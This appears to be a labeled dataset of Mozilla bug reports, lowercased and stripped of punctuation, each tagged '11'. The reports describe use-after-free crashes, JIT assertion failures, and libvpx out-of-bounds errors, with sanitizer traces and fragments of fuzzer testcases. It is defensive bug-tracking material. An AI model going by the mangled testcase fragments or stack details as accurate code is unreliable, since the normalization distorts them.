mozilla image downscaler commitrow shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 fa fa fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe	11
uaf in sigslot code mutexautolock mutexautolock this bug was filed from the socorro interface and is report bp-4cae62bb-dbad-4a1c-b4bb-64ada2151215 uaf	11
crash in nsprescontext getparentprescontext from nsrefreshdriver iswaitingforpaint this bug was filed from the socorro interface and is report bp-afcbf2df-d834-429d-9fb8-d56922160114 uaf read 70 in the last week called from nsrefreshdriver iswaitingforpaint very likely the view has been freed something is n't holding a ref it needs probably goes back to at least 38 and likely much further some indications in crashstats indicate 22 though those may be different crashes in the same function 22 android crash is nsviewmanager callwillpaintonobservers 22 windows isdompainteventwaiting cc/ni jet for triage	11
assertion failure argument check fail at js/src/jit/macroassembler.cpp:1445 with oom the following testcase crashes on mozilla-central revision 5f7c184ccd80 build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal disable-tests enable-debug run with fuzzing-safe thread-count=2 ion-offthread-compile=off baseline-eager ion-eager lfbuffer objectemulatingundefined function 0 new date tolocalestring enus oomtest 0 thisprops gc adddebuggee.enabled lfbuffer lfbuffer.split n lfcodebuffer 0 for i 0 i 10 i line lfbuffer.shift lfcodebuffer line n loadfile lfcodebuffer function loadfile lfvarx eval lfvarx backtrace program received signal sigtrap trace/breakpoint trap in 0 in 1 in 2 in 3 in 4 in rax 140737352868432 rbx 140737353644617 rcx 1407375019188016 rdx 140737295419008 rsi 0 rdi 140737488309168 rbp 4 rsp 140737488309680 r8 6 r9 0 r10 3370540194 r11 140737333328224 r12 115 r13 140737488311680 r14 0 r15 140737295418816 rip 140737353645056 movabs r11 cmp rsp r11 this oom is quite fragile just addings prints anywhere in the code make the crash go away i ve seen this before but only this time i was able to extract a proper test	11
make sure the animationmanager/transitionmanager objects stay alive for the duration their dispatchevents calls i have some concerns about the code that we fixed in bug 1211334 and the way we fixed it in particular bug 1211334 comment 1 suggests that we were crashing due to calling context animationmanager dispatchevents with a null animationmanager pointer as noted in that comment this suggests that the context animationmanager was changing to null while we were running the transitionmanager s dispatchevents call this would happen via a call to nsprescontext setshell nullptr which nspresshell calls in its destroy method so we re hitting this code 1187 if mtransitionmanager 1188 mtransitionmanager disconnect 1189 mtransitionmanager nullptr 1190 1191 if manimationmanager 1192 manimationmanager disconnect 1193 manimationmanager nullptr 1194 these manager pointers are refptr s so when we clear them here we might be destroying these objects this happens while we re inside of a call to a transitionmanager method dispatchevents these mxr searches suggest to me that there are no other owning references to these objects though i m not 100 sure which means these nulling-out operations probably delete these objects so it looks to me like we could end up deleting the transitionmanager partway through its dispatchevents method which suggests that dispatchevents could end up using deleted data for the remainder of its run this same problem could also happen during transitionmanager dispatchevents	11
crash jsautocompartment jsautocompartment mozilla dom console processcalldata with gczeal testcase requires in order to call gczeal easiest way is to run funfuzz/dom/automation/dominteresting.py build testcase debug jsautocompartment jsautocompartment invalid read js compartmentchecker fail compartment mismatch debug+asan jsautocompartment jsautocompartment invalid read non-debug testcase does not run because gczeal is disabled	11
root questionable-looking stack variables i looked through where we call replacechild appendchild removechild and insertbefore to find places that do not root this on the stack and i found a few places that look sketchy we should fix these i m not sure if it is worth trying to write a test case or if we should treat these as real sec bugs or just more of an audit situation i ll file a separate bug for adding a static analysis for these problems in htmltableelement insertrow parent is not rooted 538 parent appendchild newrow aerror 538 in nstreesanitizer sanitizechildren parent is not rooted 1423 parent insertbefore child node rv 1423 in htmlselectelement add parent is not rooted 590 parent insertbefore aelement abefore aerror 590 in nsrange cutcontents parent is not rooted 2097 parent removechild node error 2097 there s some kind of mutation guard but afaict in the scenario of a hostile mutation observer that destroys parent it is already too late by the time we check the guard	11
assertion failure data 28 the instruction does not have condition code at js/src/jit/arm/assembler-arm.h:1967 the following testcase crashes on mozilla-central revision f61c3cc0eb8b build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal target=i686-pc-linux-gnu disable-tests enable-simulator=arm enable-debug run with ion-eager arm-hwcap=vfp ion-offthread-compile=off arm-asm-nop-fill=1 min.js gczeal 2 for lflocal in this backtrace program received signal sigsegv segmentation fault in js jit instruction extractcond this at js/src/jit/arm/assembler-arm.h:1967 0 in js jit instruction extractcond this at js/src/jit/arm/assembler-arm.h:1967 1 in extractcond this at js/src/jit/arm/assembler-arm.cpp:3209 2 instisguard ph synthetic pointer inst at js/src/jit/arm/assembler-arm.cpp:3112 3 js jit instruction next this at js/src/jit/arm/assembler-arm.cpp:3205 4 in next this at js/src/jit/arm/assembler-arm.h:2219 5 js jit assembler getcf32target js jit instructioniterator iter=iter entry at js/src/jit/arm/assembler-arm.cpp:716 6 in codefromjump jump at js/src/jit/arm/assembler-arm.cpp:855 7 js jit assembler tracejumprelocations trc=trc entry code=code entry reader at js/src/jit/arm/assembler-arm.cpp:865 8 in js jit jitcode tracechildren this=this entry trc=trc entry at js/src/jit/ion.cpp:809 9 in js gcmarker processmarkstacktop this=this entry budget at js/src/gc/marking.cpp:1349 10 in js gcmarker drainmarkstack this=this entry budget at js/src/gc/marking.cpp:1247 11 in js gc gcruntime drainmarkstack this=this entry slicebudget phase=phase entry=js gcstats phase_mark at js/src/jsgc.cpp:5208 12 in js gc gcruntime incrementalcollectslice this=this entry budget reason=reason entry=js gcreason debug_gc at js/src/jsgc.cpp:5889 13 in js gc gcruntime gccycle this=this entry incremental=incremental entry=false budget reason=reason entry=js gcreason debug_gc at js/src/jsgc.cpp:6110 14 in js gc gcruntime collect this=this entry incremental=incremental entry=false budget reason=reason entry=js gcreason debug_gc at js/src/jsgc.cpp:6239 15 in js gc gcruntime gc this gckind=gc_normal reason=js gcreason debug_gc at js/src/jsgc.cpp:6300 16 in js gc gcruntime rundebuggc this=this entry at js/src/jsgc.cpp:6735 17 in js gc gcruntime gcifneededperallocation this cx=cx entry at js/src/gc/allocator.cpp:28 18 in js gc gcruntime checkallocatorstate js allowgc 1 this cx kind=js gc first at js/src/gc/allocator.cpp:55 19 in js allocate jsobject js allowgc 1 cx=cx entry kind=kind entry=js gc first ndynamicslots=0 heap=heap entry=js gc tenuredheap clasp=clasp entry jsfunction class at js/src/gc/allocator.cpp:121 20 in jsobject create cx kind=js gc first heap=js gc tenuredheap shape group at js/src/jsobjinlines.h:315 21 in newobject cx group kind=js gc first newkind=js singletonobject initialshapeflags=0 at js/src/jsobj.cpp:684 22 in js newobjectwithclassprotocommon cxarg=cxarg entry clasp=clasp entry jsfunction class protoarg=protoarg entry allockind=allockind entry=js gc first newkind=newkind entry=js singletonobject at js/src/jsobj.cpp:817 23 in newobjectwithclassproto newkind=js singletonobject allockind=js gc first proto clasp jsfunction class cx at js/src/jsobjinlines.h:707 24 js newfunctionwithproto cx native datetimeformat_tosource jscontext unsigned int js value nargs=0 flags=jsfunction native_fun enclosingdynamicscope atom proto allockind=js gc first newkind=js singletonobject at js/src/jsfun.cpp:2014 25 in newnativefunction newkind=js genericobject allockind=js gc first atom nargs=0 native datetimeformat_tosource jscontext unsigned int js value cx at js/src/jsfun.cpp:1956 26 js definefunction cx=cx entry obj id=id entry native datetimeformat_tosource jscontext unsigned int js value nargs=0 flags=0 flags entry=512 allockind=allockind entry=js gc first newkind=newkind entry=js genericobject at js/src/jsfun.cpp:2267 27 in js_definefunctions cx=cx entry obj=obj entry fs datetimeformat_methods+20 fs entry datetimeformat_methods behavior=behavior entry=defineallproperties at js/src/jsapi.cpp:3640 28 in initdatetimeformatclass global intl cx at js/src/builtin/intl.cpp:1672 29 js initintlclass cx=cx entry obj=obj entry at js/src/builtin/intl.cpp:2089 30 in js globalobject resolveconstructor cx global key=jsproto_intl at js/src/vm/globalobject.cpp:133 31 in js globalobject ensureconstructor cx=cx entry global global entry key=key entry=jsproto_intl at js/src/vm/globalobject.cpp:100 32 in js globalobject initstandardclasses cx=cx entry global=global entry at js/src/vm/globalobject.cpp:340 33 in js_enumeratestandardclasses cx=cx entry obj=obj entry at js/src/jsapi.cpp:1363 34 in global_enumerate cx obj at js/src/shell/js.cpp:5138 35 in snapshot cx=cx entry pobj pobj entry flags=flags entry=1 props=props entry at js/src/jsiter.cpp:314 36 in js getiterator cx=cx entry obj=obj entry flags=flags entry=1 objp=objp entry at js/src/jsiter.cpp:814 37 in js valuetoiterator cx flags=1 vp at js/src/jsiter.cpp:1089 38 in js jit simulator softwareinterrupt this instr at js/src/jit/arm/simulator-arm.cpp:2174 39 in js jit simulator decodetype7 this instr at js/src/jit/arm/simulator-arm.cpp:3280 40 in js jit simulator instructiondecode this=this entry instr=instr entry at js/src/jit/arm/simulator-arm.cpp:4199 41 in execute false this at js/src/jit/arm/simulator-arm.cpp:4254 42 js jit simulator callinternal this=this entry entry=entry entry 377\377\377\352\360o-\351\377\377\377\352\004\320m\342\377\377\377\352\020\212-\355\377\377\377\352\r\200\240\341\377\377\377\352h\220\235\345\377\377\377\352\r\260\240\341\377\377\377\352t\240\235\345\377\377\377 incomplete sequence 352 at js/src/jit/arm/simulator-arm.cpp:4342 43 in js jit simulator call this optimized out entry=entry entry 377\377\377\352\360o-\351\377\377\377\352\004\320m\342\377\377\377\352\020\212-\355\377\377\377\352\r\200\240\341\377\377\377\352h\220\235\345\377\377\377\352\r\260\240\341\377\377\377\352t\240\235\345\377\377\377 incomplete sequence 352 argument_count optimized out argument_count entry=8 at js/src/jit/arm/simulator-arm.cpp:4425 44 in enterbaseline cx=cx entry data at js/src/jit/baselinejit.cpp:125 45 in js jit enterbaselinemethod cx=cx entry state at js/src/jit/baselinejit.cpp:157 46 in js runscript cx=cx entry state at js/src/vm/interpreter.cpp:694 47 in js executekernel cx=cx entry script script entry scopechainarg thisv newtargetvalue type=type entry=js execute_global evalinframe=evalinframe entry result=result entry at js/src/vm/interpreter.cpp:978 48 in js execute cx=cx entry script=script entry scopechainarg rval=rval entry at js/src/vm/interpreter.cpp:1012 49 in executescript cx=cx entry scope script=script entry rval=rval entry at js/src/jsapi.cpp:4353 50 in js_executescript cx=cx entry scriptarg=scriptarg entry at js/src/jsapi.cpp:4384 51 in runfile compileonly=false file filename min.js cx at js/src/shell/js.cpp:460 52 process cx=cx entry filename min.js forcetty=forcetty entry=false at js/src/shell/js.cpp:578 53 in processargs op cx optimized out at js/src/shell/js.cpp:5831 54 shell envp optimized out op cx optimized out at js/src/shell/js.cpp:6109 55 main argc=6 argv envp at js/src/shell/js.cpp:6455 eax 0 ebx 158942260 ecx 136038260 edx 0 esi 15 edi 138146132 ebp 4294949656 esp 4294949632 eip js jit instruction extractcond 42 js jit instruction extractcond 42 movl js jit instruction extractcond 52 call abort happens quite frequently so marking as fuzzblocker also involves gc and assertions about instructions generally sound like they could be security-related so marking s-s as well	11
xsl output method text triggers an assertion in debug builds soon a crashtest to reproduce this issue	11
assertion failure mtargetsize.width aoriginalsize.width created a downscale r but width is larger at c users/mozilla/debug-builds/mozilla-central/image downscaler.cpp:68 found via bughunter and reproduced with a windows 7 debug build steps to reproduce load assertion failure mtargetsize.width aoriginalsize.width created a downscale r but width is larger at c users/mozilla/debug-builds/mozilla-central/image downscaler.cpp:68 01 mozilla image nsgifdecoder2 beginimageframe c users\mozilla\debug-buil ds\mozilla-central\image\decoders\nsgifdecoder2.cpp:283 02 mozilla image nsgifdecoder2 writeinternal c users\mozilla\debug-builds mozilla-central\image\decoders\nsgifdecoder2.cpp:1106 03 mozilla image decoder write c users\mozilla\debug-builds\mozilla-centr al\image\decoder.cpp:186 04 mozilla image decoder decode c users\mozilla\debug-builds\mozilla-cent ral\image\decoder.cpp:128 05 mozilla image decodepool decode c users\mozilla\debug-builds\mozilla-c entral\image\decodepool.cpp:455 06 mozilla image decodepoolworker run c users\mozilla\debug-builds\mozill a-central\image\decodepool.cpp:292 07 nsthread processnextevent c users\mozilla\debug-builds\mozilla-central\x pcom\threads\nsthread.cpp:960 08 ns_processnextevent c users\mozilla\debug-builds\mozilla-central\xpcom\gl ue\nsthreadutils.cpp:277 09 mozilla ipc messagepumpfornonmainthreads run c users\mozilla\debug-bui lds\mozilla-central\ipc\glue\messagepump.cpp:355 10 messageloop runinternal c users\mozilla\debug-builds\mozilla-central\ipc chromium\src\base\message_loop.cc:234 11 messageloop runhandler c users\mozilla\debug-builds\mozilla-central\ipc chromium\src\base\message_loop.cc:228 12 messageloop run c users\mozilla\debug-builds\mozilla-central\ipc\chromiu m\src\base\message_loop.cc:202 13 nsthread threadfunc c users\mozilla\debug-builds\mozilla-central\xpcom\t hreads\nsthread.cpp:384 14 pr_nativerunthread c users\mozilla\debug-builds\mozilla-central\nsprpub pr\src\threads\combined\pruthr.c:397 15 pr_root c users\mozilla\debug-builds\mozilla-central\nsprpub\pr\src\md\wi ndows\w95thred.c:90 16 get_flsindex msvcr120 17 get_flsindex msvcr120 18 basethreadinitthunk kernel32 19 rtlinitializeexceptionchain ntdll 20 rtlinitializeexceptionchain ntdll	11
ubsan index out of bounds vp8_mb_init_dequantizer this was found by fuzzing libvpx commit c6641709a707ccb98cbdf785428659e44d4f2c8b and it appears to be in our branch 84 vp8/decoder/decodeframe.c:86:25 runtime error index 127 out of bounds for type short 128 2 0 in vp8_mb_init_dequantizer home/user/desktop/libvpx/simple_decoder_ub_asan 1 in vp8_decode_frame home/user/desktop/libvpx/simple_decoder_ub_asan 2 in vp8dx_receive_compressed_data home/user/desktop/libvpx/simple_decoder_ub_asan 3 in vp8_decode home/user/desktop/libvpx/simple_decoder_ub_asan 4 in vpx_codec_decode home/user/desktop/libvpx/simple_decoder_ub_asan 5 in main home/user/code/libvpx/examples/simple_decoder.c:135:11 6 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 7 in start home/user/desktop/libvpx/simple_decoder_ub_asan	11
ubsan index out of bounds vp8_loop_filter_row_simple this was found by fuzzing libvpx commit c6641709a707ccb98cbdf785428659e44d4f2c8b and it appears to be in our branch 285 vp8/common/vp8_loopfilter.c:285:39 runtime error index 254 out of bounds for type unsigned char 64 16 0 in vp8_loop_filter_row_simple home/user/desktop/libvpx/simple_decoder_ub_asan 1 in decode_mb_rows home/user/desktop/libvpx/simple_decoder_ub_asan 2 in vp8_decode_frame home/user/desktop/libvpx/simple_decoder_ub_asan 3 in vp8dx_receive_compressed_data home/user/desktop/libvpx/simple_decoder_ub_asan 4 in vp8_decode home/user/desktop/libvpx/simple_decoder_ub_asan 5 in vpx_codec_decode home/user/desktop/libvpx/simple_decoder_ub_asan 6 in main home/user/code/libvpx/examples/simple_decoder.c:135:11 7 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 8 in start home/user/desktop/libvpx/simple_decoder_ub_asan	11
ubsan index out of bounds vp8_loop_filter_row_normal this was found by fuzzing libvpx commit c6641709a707ccb98cbdf785428659e44d4f2c8b and it appears to be in our branch 222 vp8/common/vp8_loopfilter.c:222:35 runtime error index 225 out of bounds for type unsigned char 64 0 in vp8_loop_filter_row_normal home/user/desktop/libvpx/simple_decoder_ub_asan 1 in decode_mb_rows home/user/desktop/libvpx/simple_decoder_ub_asan 2 in vp8_decode_frame home/user/desktop/libvpx/simple_decoder_ub_asan 3 in vp8dx_receive_compressed_data home/user/desktop/libvpx/simple_decoder_ub_asan 4 in vp8_decode home/user/desktop/libvpx/simple_decoder_ub_asan 5 in vpx_codec_decode home/user/desktop/libvpx/simple_decoder_ub_asan 6 in main home/user/code/libvpx/examples/simple_decoder.c:135:11 7 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 8 in start home/user/desktop/libvpx/simple_decoder_ub_asan	11
reentrance from timelinemarker during cycle collection here is what looks to be going on in bug 1224880 based on the stack something triggers a gc which calls into cyclecollectedjsruntime ongc we re apparently in the middle of an incremental cc so we want to finish the cc before we start the gc so we call nscyclecollector finishanycurrentcollection this triggers the autoglobaltimelinemarker which calls js savedstacks savecurrentstack which tries to create a new object which ends up triggering a new gc so we call back into cyclecollectedjsruntime ongc which ends up failing to finish the current cc because we are running it nested causing the assertion i m not sure what the right fix here is it looks like this landed in bug 1141614	11
crash js jit baselineframe script the following testcase crashes on mozilla-central revision 388bdc46ba51 build with enable-gczeal enable-optimize o2 g enable-address-sanitizer target=i686-pc-linux-gnu without-intl-api enable-posix-nspr-emulation disable-jemalloc disable-tests disable-debug run with fuzzing-safe thread-count=2 baseline-eager ion-extra-checks ion-eager definegetter x function isfinite evaluate for i=0 i 1000000 i x backtrace 16531==error addresssanitizer segv on unknown address pc sp bp t0 0 in js jit baselineframe script const js/src/jsscript.h:1235 1 in js jit baselineframe overridepc const js/src/jit/baselineframe.h:377 2 in js jit jitframeiterator baselineframe const js/src/jit/baselineframe.h:382 3 in js jit jitframeiterator baselinescriptandpc jsscript unsigned char const js/src/jit/jitframes.cpp:237 4 in js jit getpcscript jscontext jsscript unsigned char js/src/jit/jitframes.cpp:1683 5 in jscontext currentscript unsigned char jscontext maybeallowcrosscompartment const js/src/jscntxtinlines.h:462 6 in jscontext findversion const js/src/jscntxt.cpp:1160 7 in js compileoptions compileoptions jscontext jsversion js/src/jsapi.cpp:3885 8 in createemptyscriptforclone jscontext js handle jsobject js handle jsscript js/src/jsscript.cpp:3642 9 in js clonescriptintofunction jscontext js handle jsobject js handle jsfunction js handle jsscript js/src/jsscript.cpp:3680 10 in jsruntime cloneselfhostedfunctionscript jscontext js handle js propertyname js handle jsfunction js/src/vm/selfhosting.cpp:2069 11 in jsfunction createscriptforlazilyinterpretedfunction jscontext js handle jsfunction js/src/jsfun.cpp:1468 12 in jsfunction getorcreatescript jscontext js/src/jsfun.h:398 13 in jsobject makelazygroup jscontext js handle jsobject js/src/vm/objectgroup.cpp:310 14 in js typeset objectkey singleton js/src/jsobjinlines.h:136 15 in js heaptypesetkey instantiate jscontext js/src/vm/typeinference.cpp:1301 16 in anonymous namespace compilerconstraintinstance anonymous namespace constraintdatafreezeobjectflags generatetypeconstraint jscontext js recompileinfo js/src/vm/typeinference.cpp:1193 17 in js finishcompilation jscontext js handle jsscript js compilerconstraintlist js recompileinfo bool js/src/vm/typeinference.cpp:1404 18 in js jit codegenerator link jscontext js compilerconstraintlist js/src/jit/codegenerator.cpp:8133 19 in linkcodegen jscontext js jit ionbuilder js jit codegenerator js mutablehandle js traceablevector jsscript 0u js tempallocpolicy js defaultgcpolicy jsscript onioncompilationinfo js/src/jit/ion.cpp:566 20 in linkbackgroundcodegen jscontext js jit ionbuilder js mutablehandle js traceablevector jsscript 0u js tempallocpolicy js defaultgcpolicy jsscript onioncompilationinfo js/src/jit/ion.cpp:588 21 in js jit lazylink jscontext js handle jsscript js/src/jit/ion.cpp:614 22 in js jit lazylinktopactivation jscontext js/src/jit/ion.cpp:645 addresssanitizer can not provide additional info summary addresssanitizer segv js/src/jsscript.h:1235 js jit baselineframe script const 16531==aborting this test crashes also regular builds but it reproduces really bad there 1 with a 32-bit asan build it almost always reproduces for me	11
crash isderivedclassconstructor or assertion failure isinterpretedlazy u.i.s.lazy at jsfun.h:452 the following testcase crashes on mozilla-central revision d7a0ad85d9fb build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal disable-tests disable-debug run with fuzzing-safe no-threads disable-oom-functions ion-eager baseline-eager ion-extra-checks gcpreservecode setjitcompileroption ion.warmup.trigger 20 datetimeformat newglobal intl.datetimeformat new datetimeformat gc new datetimeformat backtrace program received signal sigsegv segmentation fault isderivedclassconstructor this at js/src/jsfun.h:537 0 isderivedclassconstructor this at js/src/jsfun.h:537 1 js jit ionbuilder createthis this=this entry target=target entry callee newtarget at js/src/jit/ionbuilder.cpp:6269 2 in js jit ionbuilder makecallhelper this=this entry target=target entry callinfo at js/src/jit/ionbuilder.cpp:6719 3 in js jit ionbuilder makecall this=this entry target=target entry callinfo at js/src/jit/ionbuilder.cpp:6768 4 in js jit ionbuilder jsop_call this=this entry argc optimized out constructing optimized out at js/src/jit/ionbuilder.cpp:6585 5 in js jit ionbuilder inspectopcode this=this entry op=op entry=jsop_new at js/src/jit/ionbuilder.cpp:1887 6 in js jit ionbuilder traversebytecode this=this entry at js/src/jit/ionbuilder.cpp:1521 7 in js jit ionbuilder build this at js/src/jit/ionbuilder.cpp:917 8 in js jit ioncompile cx=cx entry script optimized out baselineframe=baselineframe entry osrpc optimized out constructing optimized out recompile optimized out optimizationlevel=js jit normal at js/src/jit/ion.cpp:2213 9 in js jit compile cx=cx entry script=script entry osrframe=osrframe entry osrpc=osrpc entry constructing optimized out forcerecompile=forcerecompile entry=false at js/src/jit/ion.cpp:2451 10 in js jit canenter cx=cx entry state at js/src/jit/ion.cpp:2613 11 in js runscript cx=cx entry state at js/src/vm/interpreter.cpp:383 12 in js invoke cx=cx entry args construct=construct entry=js no_construct at js/src/vm/interpreter.cpp:478 13 in intlinitialize cx=cx entry obj obj entry initializer locales locales entry options=options entry at js/src/builtin/intl.cpp:486 14 in datetimeformat cx=cx entry args construct optimized out at js/src/builtin/intl.cpp:1679 15 in datetimeformat cx=cx entry argc optimized out vp optimized out at js/src/builtin/intl.cpp:1691 16 in calljsnative args native datetimeformat jscontext unsigned int js value cx at js/src/jscntxtinlines.h:235 17 calljsnativeconstructor args native datetimeformat jscontext unsigned int js value cx at js/src/jscntxtinlines.h:268 18 internalconstruct cx=cx entry args at js/src/vm/interpreter.cpp:537 19 in js construct cx=cx entry fval fval entry args newtarget rval at js/src/vm/interpreter.cpp:586 20 in js directproxyhandler construct this=this entry js crosscompartmentwrapper singleton cx=cx entry proxy proxy entry args at js/src/proxy/directproxyhandler.cpp:95 21 in js crosscompartmentwrapper construct this js crosscompartmentwrapper singleton cx wrapper args at js/src/proxy/crosscompartmentwrapper.cpp:309 22 in js proxy construct cx proxy=proxy entry args at js/src/proxy/proxy.cpp:410 23 in js proxy_construct cx optimized out argc optimized out vp optimized out at js/src/proxy/proxy.cpp:692 24 in calljsnative args native js proxy_construct jscontext unsigned int js value cx at js/src/jscntxtinlines.h:235 25 calljsnativeconstructor args native js proxy_construct jscontext unsigned int js value cx at js/src/jscntxtinlines.h:268 26 internalconstruct cx=cx entry args at js/src/vm/interpreter.cpp:549 27 in js construct cx=cx entry fval fval entry args newtarget newtarget entry rval rval entry at js/src/vm/interpreter.cpp:586 28 in js jit docallfallback cx frame stub argc=0 vp res at js/src/jit/baselineic.cpp:6164 29 in 39 in rax 0 rbx 140737330659744 rcx 140737330686864 rdx 140737330686864 rsi 140737352660320 rdi 140737330659744 rbp 140737330686864 rsp 140737488339600 r8 646 r9 37360 r10 140737352658944 r11 13 r12 140737330686864 r13 140737330687240 r14 140737330659744 r15 8 rip js jit ionbuilder createthis jsfunction js jit mdefinition js jit mdefinition 53 js jit ionbuilder createthis jsfunction js jit mdefinition js jit mdefinition 53 movzbl rax eax js jit ionbuilder createthis jsfunction js jit mdefinition js jit mdefinition 57 shr al marking s-s because this involves the gc and in particular gc code preservation	11
bmp mozilla image imgframe imageupdated testcase might not work looks related to threads only the following testcase crashes on en-us.linux-x86_64-asan.tar.bz2 revision e55a86dcfdc632d4975a5cebddc8d6f83ab3d28d see attachment backtrace 24096==error addresssanitizer segv on unknown address pc sp bp t23 0 in lock builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/dist/include/mozilla/mutex.h:69 1 in lock builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/dist/include/mozilla/monitor.h:35 2 in monitorautolock builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/dist/include/mozilla/monitor.h:78 3 in mozilla image imgframe imageupdated mozilla gfx intrecttyped mozilla gfx unknownunits const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/imgframe.cpp:613 4 in mozilla image decoder postinvalidation mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla maybe mozilla gfx intrecttyped mozilla gfx unknownunits const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:474 5 in mozilla image nsbmpdecoder finishrow builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:420 6 in mozilla image nsbmpdecoder finishinternal builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:243 7 in mozilla image decoder completedecode builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:196 8 in mozilla image decoder decode mozilla image iresumable builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:122 9 in mozilla image decodepool decode mozilla image decoder builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:455 10 in mozilla image decodepoolworker run builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:281 11 in nsthread processnextevent bool bool builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:989 12 in ns_processnextevent nsithread bool builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:297 13 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/glue/messagepump.cpp:326 14 in runinternal builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:234 15 in runhandler builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:227 16 in messageloop run builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:201 17 in nsthread threadfunc void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:401 18 in pt_root builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:212 19 in start_thread lib/x86_64-linux-gnu/libpthread.so.0 addresssanitizer can not provide additional info summary addresssanitizer segv builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/dist/include/mozilla/mutex.h:69 lock thread t23 imgdecoder 4 created by t0 web content here 0 in pthread_create builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:175 1 in pr_createthread builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:453 2 in pr_createthread builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:544 3 in nsthread init builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:521 4 in nsthreadmanager newthread unsigned int unsigned int nsithread builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthreadmanager.cpp:249 5 in ns_newthread nsithread nsirunnable unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:71 6 in mozilla image decodepool decodepool builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:357 7 in mozilla image decodepool singleton builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:314 8 in mozilla image initmodule builds/slave/m-in-l64-asan-0000000000000000/build/src/image/build/nsimagemodule.cpp:95 9 in load builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:898 10 in nsfactoryentry getfactory builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:1934 11 in nscomponentmanagerimpl createinstancebycontractid char const nsisupports nsid const void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:1232 12 in nscomponentmanagerimpl getservicebycontractid char const nsid const void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:1591 13 in callgetservice builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nscomponentmanagerutils.cpp:67 14 in nsgetservicebycontractid operator nsid const void const builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nscomponentmanagerutils.cpp:280 15 in nscomptr_base assign_from_gs_contractid nsgetservicebycontractid nsid const builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nscomptr.cpp:103 16 in nscomptr builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/dist/include/nscomptr.h:540 17 in gfxplatform init builds/slave/m-in-l64-asan-0000000000000000/build/src/gfx/thebes/gfxplatform.cpp:627 18 in gfxplatform getplatform builds/slave/m-in-l64-asan-0000000000000000/build/src/gfx/thebes/gfxplatform.cpp:460 19 in mozilla dom contentprocess init builds/slave/m-in-l64-asan-0000000000000000/build/src/dom/ipc/contentprocess.cpp:83 20 in xre_initchildprocess builds/slave/m-in-l64-asan-0000000000000000/build/src/toolkit/xre/nsembedfunctions.cpp:603 21 in content_process_main int char builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/app contentproc/plugin-container.cpp:237 22 lib/x86_64-linux-gnu/libc.so.6	11
